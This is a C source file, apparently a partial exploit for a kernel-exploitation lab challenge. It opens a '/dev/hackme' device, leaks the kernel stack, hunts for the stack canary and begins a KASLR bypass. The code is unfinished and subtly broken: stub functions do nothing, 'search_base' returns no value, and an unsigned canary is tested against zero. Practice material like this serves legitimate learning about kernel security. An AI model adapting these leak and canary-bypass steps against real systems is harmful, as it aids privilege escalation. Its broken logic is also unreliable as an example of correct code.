#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>

#define _LENGTH(a) (sizeof(a)/sizeof(*a))

static void context_store(void) {}
static void context_load(void) {}

static size_t search_canary(size_t* buffer, int length) {
  for (int i = 0; i < length; ++i) {
    printf("Stack leak + %#lx: %#lx\n", i*8, buffer[i]);
    if ((buffer[i]>>48) < 0xffff && !(buffer[i] & 0xff))
      return buffer[i];
  }
  return -1;
}

static size_t search_base(size_t* buffer, int length) {
  for (int i = 0; i < length; ++i) {
    printf("%#lx\n", buffer[i]);
  }
}

int main(int argc, char** argv) {
  size_t buffer[32] = {0};
  int dev;
  if ((dev = open("/dev/hackme", O_RDWR)) < 0)
    return (puts("Could not open hackme device!"), -1);

  puts("Leaking kernel stack buffer..");
  if (read(dev, (char *)buffer, sizeof(buffer)) < 0)
    return (puts("Problem reading from device!"), -1);

  puts("Searching for stack canary...");
  size_t canary = search_canary(buffer, _LENGTH(buffer));
  if (canary < 0)
    return (puts("Could not find canary!"), -1);
  printf("Leaked canary: %#lx\n", canary);

  puts("Searching for invariant ptr for KASLR bypass");
  size_t kernel_base = search_base(buffer, _LENGTH(buffer));

  return 0;
}
